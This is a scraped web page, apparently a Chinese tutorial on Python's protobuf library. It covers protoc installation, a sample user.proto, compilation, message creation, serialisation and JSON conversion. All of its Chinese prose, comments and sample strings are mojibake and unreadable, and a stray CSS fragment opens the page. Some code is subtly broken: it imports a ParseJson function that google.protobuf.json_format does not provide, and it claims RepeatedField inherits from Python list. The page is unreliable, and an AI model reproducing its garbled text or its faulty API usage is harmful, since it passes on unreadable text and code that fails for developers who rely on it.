#cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯jobleap.cnçš„å°ä¹ã€‚
Protocol Buffersï¼ˆç®€ç§° Protobufï¼‰æ˜¯ Google å¼€å‘çš„è½»é‡çº§ã€é«˜æ•ˆçš„åºåˆ—åŒ–æ•°æ®ç»“æ„æ ¼å¼ï¼Œå¹¿æ³›ç”¨äºè·¨è¯­è¨€ã€è·¨å¹³å°çš„æ•°æ®ä¼ è¾“å’Œå­˜å‚¨ã€‚Python ä½œä¸ºä¸»æµå¼€å‘è¯­è¨€ï¼Œå…¶ <code>protobuf</code> åº“æä¾›äº†å®Œæ•´çš„ API æ”¯æŒï¼Œæœ¬æ–‡å°†ä»ç¯å¢ƒæ­å»ºã€Proto æ–‡ä»¶å®šä¹‰ã€æ ¸å¿ƒ API ç”¨æ³•åˆ°å®æˆ˜æ¡ˆä¾‹ï¼Œå…¨é¢ä¸²è”å¸¸ç”¨åŠŸèƒ½ï¼Œå¸®åŠ©ä½ æŒæ¡ Python æ“ä½œ Protobuf çš„å…¨æµç¨‹ã€‚</p>
<h2 data-id="heading-0">ä¸€ã€ç¯å¢ƒå‡†å¤‡</h2>
<h3 data-id="heading-1">1. å®‰è£…æ ¸å¿ƒä¾èµ–</h3>
<p>Protobuf çš„ Python å¼€å‘éœ€è¦ä¸¤ä¸ªæ ¸å¿ƒç»„ä»¶ï¼š</p>
<ul>
<li><code>protobuf</code> åº“ï¼šPython è¿è¡Œæ—¶ï¼Œç”¨äºæ“ä½œç¼–è¯‘åçš„ Protobuf æ¶ˆæ¯ã€‚</li>
<li><code>protoc</code> ç¼–è¯‘å™¨ï¼šå°† <code>.proto</code> å®šä¹‰æ–‡ä»¶ç¼–è¯‘ä¸º Python ä»£ç ã€‚</li>
</ul>
<h4 data-id="heading-2">å®‰è£… <code>protobuf</code> åº“</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ¨èå®‰è£…ç¨³å®šç‰ˆï¼ˆä¸protocç‰ˆæœ¬åŒ¹é…ï¼‰</span>
pip install protobuf==4.25.3  <span class="hljs-comment"># ç‰ˆæœ¬éœ€ä¸protocå…¼å®¹</span>
</code></pre>
<h4 data-id="heading-3">å®‰è£… <code>protoc</code> ç¼–è¯‘å™¨</h4>
<ul>
<li><strong>Windows</strong>ï¼šä» <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fprotocolbuffers%2Fprotobuf%2Freleases" target="_blank" title="https://github.com/protocolbuffers/protobuf/releases" ref="nofollow noopener noreferrer">Protobuf å®˜æ–¹ä»“åº“</a> ä¸‹è½½ <code>protoc-{version}-win64.zip</code>ï¼Œè§£å‹åå°† <code>bin</code> ç›®å½•æ·»åŠ åˆ°ç³»ç»Ÿç¯å¢ƒå˜é‡ã€‚</li>
<li><strong>Linux</strong>ï¼š<code>sudo apt install protobuf-compiler</code>ï¼ˆDebian/Ubuntuï¼‰æˆ– <code>sudo yum install protobuf-compiler</code>ï¼ˆCentOSï¼‰ã€‚</li>
<li><strong>Mac</strong>ï¼š<code>brew install protobuf</code>ã€‚</li>
</ul>
<p>éªŒè¯å®‰è£…ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">protoc --version  <span class="hljs-comment"># è¾“å‡ºå¦‚ï¼šlibprotoc 25.3</span>
python -c <span class="hljs-string">"import google.protobuf; print(google.protobuf.__version__)"</span>  <span class="hljs-comment"># è¾“å‡ºå¦‚ï¼š4.25.3</span>
</code></pre>
<h2 data-id="heading-4">äºŒã€Proto æ–‡ä»¶å®šä¹‰ï¼ˆåŸºç¡€è¯­æ³•ï¼‰</h2>
<p>é¦–å…ˆéœ€è¦é€šè¿‡ <code>.proto</code> æ–‡ä»¶å®šä¹‰æ•°æ®ç»“æ„ï¼ŒProtobuf åˆ†ä¸º <code>proto2</code> å’Œ <code>proto3</code> ä¸¤ä¸ªç‰ˆæœ¬ï¼ˆæ¨è <code>proto3</code>ï¼Œè¯­æ³•æ›´ç®€æ´ï¼‰ã€‚</p>
<h3 data-id="heading-5">ç¤ºä¾‹ 1ï¼šåŸºç¡€æ¶ˆæ¯å®šä¹‰ï¼ˆuser.protoï¼‰</h3>
<pre><code class="hljs language-proto" lang="proto">syntax = "proto3";  // æŒ‡å®šç‰ˆæœ¬ï¼Œå¿…é¡»æ˜¯ç¬¬ä¸€è¡Œ

// åŒ…åï¼Œç”¨äºé¿å…å‘½åå†²çªï¼Œç¼–è¯‘åå¯¹åº” Python æ¨¡å—çš„å‘½åç©ºé—´
package user;

// æšä¸¾ç±»å‹ï¼šç”¨æˆ·çŠ¶æ€
enum UserStatus {
    STATUS_UNKNOWN = 0;  // proto3 æšä¸¾å¿…é¡»ä»¥ 0 ä½œä¸ºé»˜è®¤å€¼
    STATUS_ACTIVE = 1;
    STATUS_INACTIVE = 2;
}

// åµŒå¥—æ¶ˆæ¯ï¼šåœ°å€
message Address {
    string province = 1;  // å­—æ®µç¼–å·ï¼ˆ1-15 å ç”¨1å­—èŠ‚ï¼Œæ¨èç»™é«˜é¢‘å­—æ®µï¼‰
    string city = 2;
    string detail = 3;
}

// æ ¸å¿ƒæ¶ˆæ¯ï¼šç”¨æˆ·ä¿¡æ¯
message User {
    // æ ‡é‡å­—æ®µï¼šåŸºæœ¬ç±»å‹
    int64 id = 1;  // ç”¨æˆ·IDï¼ˆint64 å¯¹åº” Python intï¼‰
    string name = 2;  // ç”¨æˆ·åï¼ˆstring å¯¹åº” Python strï¼‰
    float score = 3;  // è¯„åˆ†ï¼ˆfloat å¯¹åº” Python floatï¼‰
    bool is_vip = 4;  // æ˜¯å¦VIPï¼ˆbool å¯¹åº” Python boolï¼‰
    
    // æšä¸¾å­—æ®µ
    UserStatus status = 5;
    
    // åµŒå¥—æ¶ˆæ¯å­—æ®µ
    Address address = 6;
    
    // é‡å¤å­—æ®µï¼ˆå¯¹åº” Python listï¼‰
    repeated string tags = 7;  // ç”¨æˆ·æ ‡ç­¾
    
    // æ˜ å°„å­—æ®µï¼ˆå¯¹åº” Python dictï¼‰
    map&lt;string, string&gt; ext_info = 8;  // æ‰©å±•ä¿¡æ¯
    
    // å¯é€‰å­—æ®µï¼ˆproto3 v3.15+ æ”¯æŒï¼Œéœ€æ˜¾å¼æ ‡æ³¨ optionalï¼‰
    optional string email = 9;  // å¯é€‰é‚®ç®±ï¼ˆéå¿…å¡«ï¼‰
}
</code></pre>
<h3 data-id="heading-6">æ ¸å¿ƒè¯­æ³•è¯´æ˜</h3>













































<table><thead><tr><th>è¯­æ³•å…ƒç´ </th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>syntax</code></td><td>æŒ‡å®šç‰ˆæœ¬ï¼ˆproto2/proto3ï¼‰ï¼Œå¿…é¡»æ”¾åœ¨ç¬¬ä¸€è¡Œã€‚</td></tr><tr><td><code>package</code></td><td>å‘½åç©ºé—´ï¼Œç¼–è¯‘å Python æ¨¡å—ä¼šåŒ…å«è¯¥åŒ…åã€‚</td></tr><tr><td><code>message</code></td><td>å®šä¹‰æ¶ˆæ¯ç»“æ„ï¼Œå¯¹åº” Python ä¸­çš„ç±»ã€‚</td></tr><tr><td><code>enum</code></td><td>æšä¸¾ç±»å‹ï¼Œå€¼å¿…é¡»ä¸ºæ•´æ•°ï¼Œé»˜è®¤å€¼ä¸º 0ã€‚</td></tr><tr><td>å­—æ®µç¼–å·</td><td>æ¯ä¸ªå­—æ®µçš„å”¯ä¸€ç¼–å·ï¼ˆ1-2^29-1ï¼‰ï¼Œç”¨äºåºåˆ—åŒ–/ååºåˆ—åŒ–ï¼Œ<strong>ä¸å¯éšæ„ä¿®æ”¹</strong>ã€‚</td></tr><tr><td>æ ‡é‡ç±»å‹æ˜ å°„</td><td>proto3 æ ‡é‡ç±»å‹ â†” Python ç±»å‹ï¼š<br/>int64/uint64 â†’ int<br/>string â†’ str<br/>float/double â†’ float<br/>bool â†’ bool</td></tr><tr><td><code>repeated</code></td><td>é‡å¤å­—æ®µï¼Œå¯¹åº” Python listã€‚</td></tr><tr><td><code>map</code></td><td>æ˜ å°„å­—æ®µï¼Œé”®åªèƒ½æ˜¯æ ‡é‡ç±»å‹ï¼ˆé™¤ float/doubleï¼‰ï¼Œå€¼å¯ä»¥æ˜¯ä»»æ„ç±»å‹ã€‚</td></tr><tr><td><code>optional</code></td><td>å¯é€‰å­—æ®µï¼Œæœªèµ‹å€¼æ—¶è¿”å›é»˜è®¤å€¼ï¼ˆå¦‚ string è¿”å› ""ï¼Œint è¿”å› 0ï¼‰ã€‚</td></tr></tbody></table>
<h2 data-id="heading-7">ä¸‰ã€ç¼–è¯‘ Proto æ–‡ä»¶ä¸º Python ä»£ç </h2>
<p>ä½¿ç”¨ <code>protoc</code> ç¼–è¯‘å™¨å°† <code>.proto</code> æ–‡ä»¶ç¼–è¯‘ä¸º Python å¯å¯¼å…¥çš„æ¨¡å—ï¼š</p>
<h3 data-id="heading-8">ç¼–è¯‘å‘½ä»¤</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># è¯­æ³•ï¼šprotoc --python_out=&lt;è¾“å‡ºç›®å½•&gt; &lt;protoæ–‡ä»¶è·¯å¾„&gt;</span>
protoc --python_out=./gen user.proto
</code></pre>
<p>æ‰§è¡Œåä¼šåœ¨ <code>./gen</code> ç›®å½•ä¸‹ç”Ÿæˆ <code>user_pb2.py</code> æ–‡ä»¶ï¼ˆå‘½åè§„åˆ™ï¼š<code>{protoæ–‡ä»¶å}_pb2.py</code>ï¼‰ï¼Œè¿™æ˜¯ Python æ“ä½œ Protobuf çš„æ ¸å¿ƒæ¨¡å—ã€‚</p>
<blockquote>
<p>æ³¨æ„ï¼šç¼–è¯‘åçš„æ–‡ä»¶æ— éœ€æ‰‹åŠ¨ä¿®æ”¹ï¼Œç›´æ¥å¯¼å…¥ä½¿ç”¨å³å¯ã€‚</p>
</blockquote>
<h2 data-id="heading-9">å››ã€æ ¸å¿ƒ API å®æˆ˜ï¼ˆä¸²è”æ‰€æœ‰å¸¸ç”¨åŠŸèƒ½ï¼‰</h2>
<p>ä»¥ä¸‹åŸºäºç¼–è¯‘åçš„ <code>user_pb2.py</code>ï¼Œæ¼”ç¤º Python æ“ä½œ Protobuf çš„å…¨æµç¨‹ APIã€‚</p>
<h3 data-id="heading-10">1. å¯¼å…¥ç¼–è¯‘åçš„æ¨¡å—</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># ç¡®ä¿ gen ç›®å½•åœ¨ Python è·¯å¾„ä¸­ï¼ˆæˆ–æ·»åŠ åˆ° sys.pathï¼‰</span>
<span class="hljs-keyword">import</span> sys
sys.path.append(<span class="hljs-string">"./gen"</span>)

<span class="hljs-keyword">from</span> user_pb2 <span class="hljs-keyword">import</span> User, Address, UserStatus  <span class="hljs-comment"># å¯¼å…¥ç”Ÿæˆçš„æ¶ˆæ¯ç±»å’Œæšä¸¾</span>
</code></pre>
<h3 data-id="heading-11">2. åˆ›å»ºæ¶ˆæ¯å®ä¾‹ï¼ˆå­—æ®µèµ‹å€¼ï¼‰</h3>
<h4 data-id="heading-12">æ–¹å¼1ï¼šæ„é€ å‡½æ•°ç›´æ¥èµ‹å€¼</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># åˆ›å»ºåµŒå¥—æ¶ˆæ¯ï¼šåœ°å€</span>
addr = Address(
    province=<span class="hljs-string">"å¹¿ä¸œçœ"</span>,
    city=<span class="hljs-string">"æ·±åœ³å¸‚"</span>,
    detail=<span class="hljs-string">"ç§‘æŠ€å›­è·¯100å·"</span>
)

<span class="hljs-comment"># åˆ›å»ºæ ¸å¿ƒæ¶ˆæ¯ï¼šç”¨æˆ·</span>
user = User(
    <span class="hljs-built_in">id</span>=<span class="hljs-number">1001</span>,
    name=<span class="hljs-string">"å¼ ä¸‰"</span>,
    score=<span class="hljs-number">98.5</span>,
    is_vip=<span class="hljs-literal">True</span>,
    status=UserStatus.STATUS_ACTIVE,  <span class="hljs-comment"># æšä¸¾èµ‹å€¼</span>
    address=addr,  <span class="hljs-comment"># åµŒå¥—æ¶ˆæ¯èµ‹å€¼</span>
    tags=[<span class="hljs-string">"å­¦ç”Ÿ"</span>, <span class="hljs-string">"ç¨‹åºå‘˜"</span>],  <span class="hljs-comment"># é‡å¤å­—æ®µèµ‹å€¼</span>
    ext_info={<span class="hljs-string">"phone"</span>: <span class="hljs-string">"13800138000"</span>, <span class="hljs-string">"age"</span>: <span class="hljs-string">"25"</span>}  <span class="hljs-comment"># æ˜ å°„å­—æ®µèµ‹å€¼</span>
)

<span class="hljs-comment"># å¯é€‰å­—æ®µå•ç‹¬èµ‹å€¼ï¼ˆå¦‚æœæœªèµ‹å€¼ï¼Œé»˜è®¤è¿”å›ç©ºå­—ç¬¦ä¸²ï¼‰</span>
user.email = <span class="hljs-string">"zhangsan@example.com"</span>
</code></pre>
<h4 data-id="heading-13">æ–¹å¼2ï¼šåˆ†æ­¥èµ‹å€¼ï¼ˆæ›´çµæ´»ï¼‰</h4>
<pre><code class="hljs language-python" lang="python">user2 = User()
user2.<span class="hljs-built_in">id</span> = <span class="hljs-number">1002</span>
user2.name = <span class="hljs-string">"æå››"</span>
user2.score = <span class="hljs-number">89.0</span>
user2.is_vip = <span class="hljs-literal">False</span>
user2.status = UserStatus.STATUS_INACTIVE

<span class="hljs-comment"># åµŒå¥—æ¶ˆæ¯åˆ†æ­¥èµ‹å€¼</span>
user2.address.province = <span class="hljs-string">"åŒ—äº¬å¸‚"</span>
user2.address.city = <span class="hljs-string">"åŒ—äº¬å¸‚"</span>
user2.address.detail = <span class="hljs-string">"ä¸­å…³æ‘å¤§è¡—1å·"</span>

<span class="hljs-comment"># é‡å¤å­—æ®µæ·»åŠ å…ƒç´ ï¼ˆæ”¯æŒ append/extend/addï¼‰</span>
user2.tags.append(<span class="hljs-string">"æ•™å¸ˆ"</span>)
user2.tags.extend([<span class="hljs-string">"åšä¸»"</span>, <span class="hljs-string">"æ—…è¡Œè€…"</span>])
<span class="hljs-comment"># æˆ–ä½¿ç”¨ add()ï¼ˆä»…å…¼å®¹ proto2 é£æ ¼ï¼Œproto3 ä¹Ÿå¯ç”¨ï¼‰</span>
<span class="hljs-comment"># user2.tags.add("åšä¸»")</span>

<span class="hljs-comment"># æ˜ å°„å­—æ®µèµ‹å€¼</span>
user2.ext_info[<span class="hljs-string">"phone"</span>] = <span class="hljs-string">"13900139000"</span>
user2.ext_info[<span class="hljs-string">"age"</span>] = <span class="hljs-string">"30"</span>

<span class="hljs-comment"># å¯é€‰å­—æ®µèµ‹å€¼</span>
user2.email = <span class="hljs-string">"lisi@example.com"</span>
</code></pre>
<h3 data-id="heading-14">3. å­—æ®µè®¿é—®ä¸æ ¡éªŒ</h3>
<h4 data-id="heading-15">ï¼ˆ1ï¼‰åŸºç¡€å­—æ®µè®¿é—®</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-built_in">print</span>(<span class="hljs-string">"ç”¨æˆ·ID:"</span>, user.<span class="hljs-built_in">id</span>)  <span class="hljs-comment"># 1001</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"ç”¨æˆ·å:"</span>, user.name)  <span class="hljs-comment"># å¼ ä¸‰</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"æ˜¯å¦VIP:"</span>, user.is_vip)  <span class="hljs-comment"># True</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"æšä¸¾çŠ¶æ€:"</span>, user.status)  <span class="hljs-comment"># 1ï¼ˆæšä¸¾å€¼ï¼‰</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"æšä¸¾çŠ¶æ€åç§°:"</span>, UserStatus.Name(user.status))  <span class="hljs-comment"># STATUS_ACTIVE</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"å¯é€‰é‚®ç®±:"</span>, user.email)  <span class="hljs-comment"># zhangsan@example.com</span>

<span class="hljs-comment"># åµŒå¥—æ¶ˆæ¯è®¿é—®</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"çœä»½:"</span>, user.address.province)  <span class="hljs-comment"># å¹¿ä¸œçœ</span>

<span class="hljs-comment"># é‡å¤å­—æ®µè®¿é—®ï¼ˆlist æ“ä½œï¼‰</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"æ ‡ç­¾åˆ—è¡¨:"</span>, user.tags)  <span class="hljs-comment"># ['å­¦ç”Ÿ', 'ç¨‹åºå‘˜']</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"ç¬¬ä¸€ä¸ªæ ‡ç­¾:"</span>, user.tags[<span class="hljs-number">0</span>])  <span class="hljs-comment"># å­¦ç”Ÿ</span>

<span class="hljs-comment"># æ˜ å°„å­—æ®µè®¿é—®ï¼ˆdict æ“ä½œï¼‰</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"æ‰‹æœºå·:"</span>, user.ext_info[<span class="hljs-string">"phone"</span>])  <span class="hljs-comment"># 13800138000</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"æ‰€æœ‰æ‰©å±•ä¿¡æ¯:"</span>, <span class="hljs-built_in">dict</span>(user.ext_info))  <span class="hljs-comment"># {'phone': '13800138000', 'age': '25'}</span>
</code></pre>
<h4 data-id="heading-16">ï¼ˆ2ï¼‰å­—æ®µå­˜åœ¨æ€§æ£€æŸ¥ï¼ˆoptional å­—æ®µä¸“ç”¨ï¼‰</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># æ£€æŸ¥ optional å­—æ®µæ˜¯å¦èµ‹å€¼ï¼ˆproto3 ä»… optional å­—æ®µæ”¯æŒ has_fieldï¼‰</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"æ˜¯å¦è®¾ç½®é‚®ç®±:"</span>, user.HasField(<span class="hljs-string">"email"</span>))  <span class="hljs-comment"># True</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"æ˜¯å¦è®¾ç½®æ€§åˆ«ï¼ˆæœªå®šä¹‰å­—æ®µï¼‰:"</span>, user.HasField(<span class="hljs-string">"gender"</span>))  <span class="hljs-comment"># æŠ¥é”™ï¼ˆå­—æ®µä¸å­˜åœ¨ï¼‰</span>

<span class="hljs-comment"># æ¸…ç©ºå­—æ®µ</span>
user.ClearField(<span class="hljs-string">"email"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"æ¸…ç©ºåé‚®ç®±:"</span>, user.email)  <span class="hljs-comment"># ""ï¼ˆé»˜è®¤å€¼ï¼‰</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"æ¸…ç©ºåæ˜¯å¦å­˜åœ¨é‚®ç®±:"</span>, user.HasField(<span class="hljs-string">"email"</span>))  <span class="hljs-comment"># False</span>
</code></pre>
<h4 data-id="heading-17">ï¼ˆ3ï¼‰æ¶ˆæ¯å®Œæ•´æ€§æ ¡éªŒ</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># æ£€æŸ¥æ¶ˆæ¯æ˜¯å¦åˆå§‹åŒ–å®Œæˆï¼ˆproto3 ä¸­æ— å¿…å¡«å­—æ®µï¼Œä»…æ£€æŸ¥åµŒå¥—æ¶ˆæ¯æ˜¯å¦åˆå§‹åŒ–ï¼‰</span>
<span class="hljs-keyword">try</span>:
    user.CheckInitialized()
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"æ¶ˆæ¯åˆå§‹åŒ–å®Œæˆ"</span>)
<span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"æ¶ˆæ¯æœªåˆå§‹åŒ–:"</span>, e)
</code></pre>
<h3 data-id="heading-18">4. åºåˆ—åŒ–ä¸ååºåˆ—åŒ–ï¼ˆæ ¸å¿ƒåŠŸèƒ½ï¼‰</h3>
<p>Protobuf çš„æ ¸å¿ƒä»·å€¼æ˜¯é«˜æ•ˆåºåˆ—åŒ–ï¼Œå°†æ¶ˆæ¯è½¬æ¢ä¸ºäºŒè¿›åˆ¶å­—èŠ‚æµï¼ˆç”¨äºç½‘ç»œä¼ è¾“/å­˜å‚¨ï¼‰ï¼Œååºåˆ—åŒ–åˆ™æ˜¯å°†å­—èŠ‚æµè¿˜åŸä¸ºæ¶ˆæ¯å®ä¾‹ã€‚</p>
<h4 data-id="heading-19">ï¼ˆ1ï¼‰åºåˆ—åŒ–ï¼šMessage â†’ å­—èŠ‚æµ</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># SerializeToString()ï¼šå°†æ¶ˆæ¯åºåˆ—åŒ–ä¸º bytesï¼ˆæ¨èï¼‰</span>
user_bytes = user.SerializeToString()
<span class="hljs-built_in">print</span>(<span class="hljs-string">"åºåˆ—åŒ–åå­—èŠ‚æµ:"</span>, user_bytes)  <span class="hljs-comment"># äºŒè¿›åˆ¶å­—èŠ‚ï¼ˆé•¿åº¦è¿œå°äºJSONï¼‰</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"å­—èŠ‚æµé•¿åº¦:"</span>, <span class="hljs-built_in">len</span>(user_bytes))  <span class="hljs-comment"># ç¤ºä¾‹ï¼šçº¦50å­—èŠ‚ï¼ˆJSONéœ€çº¦200å­—èŠ‚ï¼‰</span>

<span class="hljs-comment"># å…¶ä»–åºåˆ—åŒ–æ–¹æ³•ï¼ˆå°‘ç”¨ï¼‰ï¼š</span>
<span class="hljs-comment"># SerializePartialToString()ï¼šå…è®¸æœªåˆå§‹åŒ–çš„æ¶ˆæ¯åºåˆ—åŒ–ï¼ˆè·³è¿‡æ ¡éªŒï¼‰</span>
<span class="hljs-comment"># user_partial_bytes = user.SerializePartialToString()</span>
</code></pre>
<h4 data-id="heading-20">ï¼ˆ2ï¼‰ååºåˆ—åŒ–ï¼šå­—èŠ‚æµ â†’ Message</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># æ–°å»ºç©ºæ¶ˆæ¯å®ä¾‹ï¼Œé€šè¿‡ ParseFromString() ååºåˆ—åŒ–</span>
user_new = User()
user_new.ParseFromString(user_bytes)

<span class="hljs-comment"># éªŒè¯ååºåˆ—åŒ–ç»“æœ</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"ååºåˆ—åŒ–åç”¨æˆ·å:"</span>, user_new.name)  <span class="hljs-comment"># å¼ ä¸‰</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"ååºåˆ—åŒ–åæ ‡ç­¾:"</span>, user_new.tags)  <span class="hljs-comment"># ['å­¦ç”Ÿ', 'ç¨‹åºå‘˜']</span>
</code></pre>
<h3 data-id="heading-21">5. æ¶ˆæ¯ä¸å­—å…¸/JSON äº’è½¬ï¼ˆå¸¸ç”¨ï¼‰</h3>
<p>Protobuf æä¾›äº†ä¾¿æ·çš„ API å°†æ¶ˆæ¯è½¬æ¢ä¸º Python å­—å…¸æˆ– JSON å­—ç¬¦ä¸²ï¼ˆä¾¿äºè°ƒè¯•/å…¼å®¹å…¶ä»–ç³»ç»Ÿï¼‰ã€‚</p>
<h4 data-id="heading-22">ï¼ˆ1ï¼‰æ¶ˆæ¯ â†’ å­—å…¸/JSON</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> google.protobuf.json_format <span class="hljs-keyword">import</span> MessageToDict, MessageToJson

<span class="hljs-comment"># æ¶ˆæ¯ â†’ å­—å…¸ï¼ˆä¿ç•™åŸå§‹ç±»å‹ï¼‰</span>
user_dict = MessageToDict(
    user,
    preserving_proto_field_name=<span class="hljs-literal">True</span>,  <span class="hljs-comment"># ä¿ç•™å­—æ®µåï¼ˆé»˜è®¤é©¼å³°å‘½åï¼Œå¦‚ userId â†’ idï¼‰</span>
    including_default_value_fields=<span class="hljs-literal">True</span>  <span class="hljs-comment"># åŒ…å«é»˜è®¤å€¼å­—æ®µ</span>
)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"æ¶ˆæ¯è½¬å­—å…¸:"</span>, user_dict)
<span class="hljs-comment"># è¾“å‡ºç¤ºä¾‹ï¼š</span>
<span class="hljs-comment"># {</span>
<span class="hljs-comment">#   "id": 1001,</span>
<span class="hljs-comment">#   "name": "å¼ ä¸‰",</span>
<span class="hljs-comment">#   "score": 98.5,</span>
<span class="hljs-comment">#   "is_vip": true,</span>
<span class="hljs-comment">#   "status": "STATUS_ACTIVE",</span>
<span class="hljs-comment">#   ...</span>
<span class="hljs-comment"># }</span>

<span class="hljs-comment"># æ¶ˆæ¯ â†’ JSON å­—ç¬¦ä¸²</span>
user_json = MessageToJson(
    user,
    preserving_proto_field_name=<span class="hljs-literal">True</span>,
    indent=<span class="hljs-number">2</span>  <span class="hljs-comment"># æ ¼å¼åŒ–è¾“å‡º</span>
)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"æ¶ˆæ¯è½¬JSON:\n"</span>, user_json)
</code></pre>
<h4 data-id="heading-23">ï¼ˆ2ï¼‰å­—å…¸/JSON â†’ æ¶ˆæ¯</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> google.protobuf.json_format <span class="hljs-keyword">import</span> ParseDict, ParseJson

<span class="hljs-comment"># å­—å…¸ â†’ æ¶ˆæ¯</span>
user_dict_new = {
    <span class="hljs-string">"id"</span>: <span class="hljs-number">1003</span>,
    <span class="hljs-string">"name"</span>: <span class="hljs-string">"ç‹äº”"</span>,
    <span class="hljs-string">"status"</span>: <span class="hljs-string">"STATUS_ACTIVE"</span>,
    <span class="hljs-string">"tags"</span>: [<span class="hljs-string">"è®¾è®¡å¸ˆ"</span>, <span class="hljs-string">"æ‘„å½±å¸ˆ"</span>],
    <span class="hljs-string">"ext_info"</span>: {<span class="hljs-string">"phone"</span>: <span class="hljs-string">"13700137000"</span>}
}
user_3 = ParseDict(user_dict_new, User(), preserving_proto_field_name=<span class="hljs-literal">True</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"å­—å…¸è½¬æ¶ˆæ¯åID:"</span>, user_3.<span class="hljs-built_in">id</span>)  <span class="hljs-comment"># 1003</span>

<span class="hljs-comment"># JSON â†’ æ¶ˆæ¯</span>
user_json_str = <span class="hljs-string">'''
{
  "id": 1004,
  "name": "èµµå…­",
  "is_vip": true,
  "tags": ["è¿è¥", "äº§å“"]
}
'''</span>
user_4 = ParseJson(user_json_str, User(), preserving_proto_field_name=<span class="hljs-literal">True</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"JSONè½¬æ¶ˆæ¯ååç§°:"</span>, user_4.name)  <span class="hljs-comment"># èµµå…­</span>
</code></pre>
<h3 data-id="heading-24">6. é‡å¤å­—æ®µï¼ˆRepeatedFieldï¼‰é«˜çº§æ“ä½œ</h3>
<p>é‡å¤å­—æ®µæœ¬è´¨æ˜¯ <code>RepeatedField</code> ç±»å‹ï¼ˆç»§æ‰¿è‡ª Python listï¼‰ï¼Œæ”¯æŒ list æ‰€æœ‰æ“ä½œï¼Œä¸”æä¾›é¢å¤– APIï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># æ¸…ç©ºé‡å¤å­—æ®µ</span>
user.tags.clear()
<span class="hljs-built_in">print</span>(<span class="hljs-string">"æ¸…ç©ºåæ ‡ç­¾:"</span>, user.tags)  <span class="hljs-comment"># []</span>

<span class="hljs-comment"># æ·»åŠ å¤šä¸ªå…ƒç´ </span>
user.tags.extend([<span class="hljs-string">"æŠ€æœ¯"</span>, <span class="hljs-string">"åˆ†äº«"</span>, <span class="hljs-string">"å­¦ä¹ "</span>])
<span class="hljs-built_in">print</span>(<span class="hljs-string">"æ·»åŠ åæ ‡ç­¾:"</span>, user.tags)  <span class="hljs-comment"># ['æŠ€æœ¯', 'åˆ†äº«', 'å­¦ä¹ ']</span>

<span class="hljs-comment"># æ’å…¥å…ƒç´ </span>
user.tags.insert(<span class="hljs-number">1</span>, <span class="hljs-string">"Python"</span>)
